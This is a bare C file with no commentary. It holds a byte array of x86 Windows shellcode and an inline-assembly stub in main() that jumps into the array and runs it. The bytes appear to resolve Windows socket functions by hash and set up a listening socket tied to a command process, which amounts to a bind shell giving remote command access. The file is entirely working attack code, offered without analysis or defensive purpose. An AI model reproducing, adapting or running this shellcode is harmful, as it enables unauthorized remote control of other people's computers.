

char shellcode[]={0x59,  0x81,  0xC9,  0xD3,  0x62,  0x30,  0x20,  0x41,  0x43,  0x4D,  0x64 , 0x99,  0x96,  0x8D,  0x7E,  0xE8,  0x64,  0x8B,  0x5A,  0x30,  0x8B,  0x4B,  0x0C,  0x8B,  0x49,  0x1C,  0x8B,  0x09,  0x8B,  0x69,  0x08,  0xB6,  0x03,  0x2B,  0xE2,  0x66,  0xBA,  0x33,  0x32,  0x52,  0x68,  0x77,  0x73,  0x32,  0x5F,  0x54,  0xAC,  0x3C,  0xD3,  0x75,  0x06,  0x95,  0xFF,  0x57,  0xF4,  0x95,  0x57,  0x60,  0x8B,  0x45,  0x3C,  0x8B,  0x4C,  0x05,  0x78,  0x03,  0xCD,  0x8B,  0x59,  0x20,  0x03,  0xDD,  0x33,  0xFF,  0x47,  0x8B,  0x34,  0xBB,  0x03,  0xF5,  0x99,  0xAC,  0x34,  0x71,  0x2A,  0xD0,  0x3C,  0x71,  0x75,  0xF7,  0x3A,  0x54,  0x24,  0x1C,  0x75,  0xEA,  0x8B,  0x59,  0x24,  0x03,  0xDD,  0x66,  0x8B,  0x3C,  0x7B,  0x8B,  0x59,  0x1C,  0x03,  0xDD,  0x03,  0x2C,  0xBB,  0x95,  0x5F,  0xAB,  0x57,  0x61,  0x3B,  0xF7,  0x75,  0xB4,  0x5E,  0x54,  0x6A,  0x02,  0xAD,  0xFF,  0xD0,  0x88,  0x46,  0x13,  0x8D,  0x48,  0x30,  0x8B,  0xFC,  0xF3,  0xAB,  0x40,  0x50,  0x40,  0x50,  0xAD,  0xFF,  0xD0,  0x95,  0xB8,  0x02,  0xFF,  0x1A,  0x0A,  0x32,  0xE4,  0x50,  0x54,  0x55,  0xAD,  0xFF,  0xD0,  0x85,  0xC0,  0xFE,  0x44,  0x24,  0x2D,  0x83,  0xEF,  0x6C,  0xAB,  0xAB,  0x58,  0x54,  0x54,  0x50,  0x50,  0x50,  0x54,  0x50,  0x50,  0x56,  0x50,  0xFF,  0x56,  0xE4,  0xFF,  0x56,  0xE8};
void main()
{
	__asm{
		lea eax,shellcode
		push eax
		ret
	}
}
